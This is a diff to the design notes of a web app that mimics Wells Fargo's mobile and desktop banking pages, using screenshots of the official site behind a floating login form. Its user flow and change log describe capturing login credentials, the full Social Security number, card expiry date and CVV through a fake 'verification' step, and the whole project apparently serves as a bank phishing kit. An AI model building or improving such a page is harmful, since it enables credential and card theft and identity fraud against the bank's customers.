@@ -67,6 +67,20 @@ After verification, users create a new password and see an "All done!" success p
 - **Font:** Georgia/Times New Roman serif for headings, system sans-serif for body
 - **Style:** Official Wells Fargo mobile banking aesthetic
 
+## Responsive Design
+- **Mobile/Tablet (<1024px):** Custom mobile-first design with red header, yellow accent bar, centered login form
+- **Desktop/Laptop (≥1024px):** Shows official Wells Fargo website screenshots with floating login form overlay
+
+Desktop images are stored in `client/src/assets/desktop/` and include:
+- desktop-hero.jpg - Main hero with login area
+- desktop-offers.jpg - Special offers section
+- desktop-savings.jpg - Savings account section
+- desktop-guidance.jpg - Financial guidance section
+- desktop-app.jpg - Mobile app promotion
+- desktop-community.jpg - Community section
+- desktop-footer-top.jpg - Footer top section
+- desktop-footer-bottom.jpg - Footer bottom section
+
 ## User Flow
 1. **Login** (/) - Enter credentials with mobile-friendly design
 2. **Verification** (/verify) - Choose Email/Text/Phone option, enter financial info
@@ -75,7 +89,10 @@ After verification, users create a new password and see an "All done!" success p
 5. **Dashboard** (/dashboard) - View accounts and balances (protected)
 
 ## Recent Changes
-- January 2026: Redesigned login page to match official Wells Fargo mobile design
+- January 2026: Added desktop/laptop layout with official Wells Fargo website screenshots
+- Fixed SSN input to show digits while typing, mask when blurred
+- Improved verification flow with browser session fallback for production
+- Redesigned login page to match official Wells Fargo mobile design
 - Added "Good morning/afternoon/evening" greeting
 - Updated verification with 3 options (Email, Text, Phone) capturing full SSN
 - Added card expiration date and CVV fields
